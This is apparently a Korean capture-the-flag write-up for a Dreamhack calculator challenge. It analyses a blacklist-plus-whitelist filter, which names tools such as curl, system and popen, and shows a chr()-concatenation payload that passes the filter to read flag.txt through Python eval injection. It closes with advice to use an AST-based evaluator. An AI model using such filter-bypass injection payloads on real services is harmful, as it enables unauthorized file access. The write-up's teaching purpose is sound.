# Addition calculator

[문제 링크](https://dreamhack.io/wargame/challenges/1021)

## 문제 분석

이 문제는 사용자가 입력한 수식(`formula`)을 필터링한 뒤 Python 표현식으로 계산하여 결과를 반환하는 웹 애플리케이션입니다. 입력 검증을 담당하는 `filter` 함수의 코드는 다음과 같습니다.

```python
def filter(formula):
    w_list = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    w_list.extend([" ", ".", "(", ")", "+"])

    if re.search("(system)|(curl)|(flag)|(subprocess)|(popen)", formula, re.I):
        return True
    for c in formula:
        if c not in w_list:
            return True
```

`filter` 함수는 두 단계로 입력값을 검사하고, 조건에 걸리면 `True`를 반환해 실행을 차단합니다.

1. **블랙리스트 정규표현식 검사**: `re.search`와 대소문자 무시 플래그(`re.I`)를 사용해 `system`, `curl`, `flag`, `subprocess`, `popen` 문자열 포함 여부를 확인합니다.
2. **문자 화이트리스트 검사**: `formula`의 모든 문자가 영문 대소문자, 숫자, 공백(` `), 마침표(`.`), 소괄호(`(`, `)`), 더하기(`+`) 안에 포함되는지 확인합니다.

---

## 취약점 분석

### 1. 내장 함수(`open`, `chr`)와 메서드(`read`) 호출 허용

서버가 수식 평가 시 Python 내장 함수 접근을 제한하지 않고 문자열 필터링에만 의존하기 때문에, 블랙리스트에 없는 함수를 그대로 실행할 수 있습니다. 파일 읽기에 필요한 `open()`과 `.read()`, 정수 코드를 문자로 바꾸는 `chr()`은 정규표현식 차단 목록에 포함되지 않으며, 호출에 필요한 영문자, `.`, `(`, `)` 모두 `w_list`에 포함되어 있습니다.

### 2. `chr()`과 `+` 연산자를 이용한 문자열 및 따옴표 우회

`w_list`에는 작은따옴표(`'`)와 큰따옴표(`"`)가 빠져 있어 `open("flag.txt")` 형태로 문자열 리터럴을 작성할 수 없습니다. 또한 `flag` 단어가 블랙리스트에 등록되어 있어 `flag.txt`라는 텍스트 자체가 차단됩니다.

이 두 제약은 Python의 `chr()` 함수와 문자열 연결 연산자(`+`)로 우회할 수 있습니다. `chr()`은 정수를 받아 해당 ASCII 문자를 반환하고, `+` 기호는 `w_list`에 허용되어 있습니다. `flag.txt`의 각 문자를 ASCII 코드(`102`, `108`, `97`, `103`, `46`, `116`, `120`, `116`)로 변환해 이어 붙이면 따옴표와 `flag` 문자열을 쓰지 않고도 동일한 파일 경로 문자열을 만들 수 있습니다.

---

## 익스플로잇

### 1. `flag.txt` 문자열을 `chr()` 표현식으로 변환

다음 Python 스크립트로 `flag.txt` 문자열을 `filter()`를 통과하는 `chr()` 결합 식으로 생성합니다.

```python
text = 'flag.txt'

print('+'.join([f'chr({ord(c)})' for c in text]))
```

출력 결과는 다음과 같습니다.

```text
chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)
```

### 2. 페이로드 전달 및 플래그 획득

생성한 경로 표현식을 `open().read()`에 넣어 `formula` 입력값으로 전달합니다.

```python
open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```

이 식에는 `system`, `curl`, `flag`, `subprocess`, `popen` 단어가 들어 있지 않으며, 사용된 문자도 영문자, 숫자, `.`, `(`, `)`, `+`뿐이므로 `filter()`를 통과합니다. 서버가 해당 표현식을 평가하면 `flag.txt` 파일의 내용이 반환됩니다.

---

## 결론

이 문제는 수식 계산을 위해 `eval()` 등 동적 코드 평가를 사용하면서 문자열 블랙리스트와 허용 문자 목록만으로 실행을 막으려 할 때 발생하는 코드 인젝션 취약점을 다룹니다.

Python 표현식 실행 환경에서는 따옴표나 특정 키워드를 막더라도 `chr()`, `open()`, `+` 같은 내장 함수와 연산자 조합으로 임의의 문자열을 생성하고 파일을 읽을 수 있습니다. 따라서 사칙연산 계산기 기능에서는 동적 코드 평가를 제거하고 수식 파서나 `ast` 기반의 화이트리스트 AST 평가기를 사용해 숫자 리터럴과 산술 연산자 노드만 허용해야 합니다.

